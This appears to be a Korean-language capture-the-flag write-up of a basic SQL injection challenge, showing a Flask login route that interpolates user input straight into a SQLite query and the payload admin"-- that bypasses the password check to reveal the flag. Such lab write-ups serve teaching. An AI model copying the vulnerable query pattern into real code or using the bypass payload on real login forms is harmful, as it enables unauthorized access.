### 문제 코드

#### 데이터베이스 구조

```python
DATABASE = "database.db"
if os.path.exists(DATABASE) == False:
    db = sqlite3.connect(DATABASE)
    db.execute('create table users(userid char(100), userpassword char(100));')
    db.execute(f'insert into users(userid, userpassword) values ("guest", "guest"), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}");')
    db.commit()
    db.close()
```

<img src="https://velog.velcdn.com/images/silvergun8291/post/4d6283f4-8254-4ec0-bc99-44b64eaba48e/image.png">


<br>

#### 엔드포인트: /login

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userid = request.form.get('userid')
        userpassword = request.form.get('userpassword')
        res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
        if res:
            userid = res[0]
            if userid == 'admin':
                return f'hello {userid} flag is {FLAG}'
            return f'<script>alert("hello {userid}");history.go(-1);</script>'
        return '<script>alert("wrong");history.go(-1);</script>'
```

로그인 페이지를 제공합니다.
이용자가 입력한 계정 정보가 DB에 존재하는지 확인하고 로그인 계정이 admin이면 FLAG를 출력합니다.


<br>
<br>


### 익스플로잇

유저로 부터 입력 받은 userid와 userpassword로 query를 만들고 있는데, 입력 값에 대한 검증을 하지 않고 있습니다.
그래서 SQL Injection 취약점이 발생합니다.

FLAG를 출력하기 위해서는 admin으로 로그인을 해야하기 때문에, password 입력을 우회하는 query를 짜보면

```sql
# -- 주석으로 뒤에 sql 쿼리를 없애서 인증 우회
SELECT * FROM users WHERE userid="admin"--
```

<br>

해당 쿼리를 만드는 입력을 줘보면

```
userid: admin"--
password: dummy
```

<img src="https://velog.velcdn.com/images/silvergun8291/post/72e7dc87-3772-4461-83ec-07d68be6afe9/image.png">

<img src="https://velog.velcdn.com/images/silvergun8291/post/f721433d-cec0-49fa-8aa4-dc6fd250b73e/image.png">

admin으로 로그인하는데 성공해서 FLAG가 출력되었습니다.





